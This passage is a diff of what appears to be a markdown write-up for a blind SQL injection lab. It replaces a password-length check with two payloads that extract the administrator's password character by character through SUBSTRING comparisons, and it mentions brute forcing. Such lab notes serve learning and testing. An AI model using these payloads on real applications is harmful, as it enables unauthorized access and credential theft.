@@ -57,7 +57,13 @@ This payload for know how many char in password by ```length > 1``` is resutl tr
 we can use brute force to know this.
 
 ```
-' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
+' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')>'0
+```
+
+or
+
+```
+' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)>'0
 ```
 
 ### 1
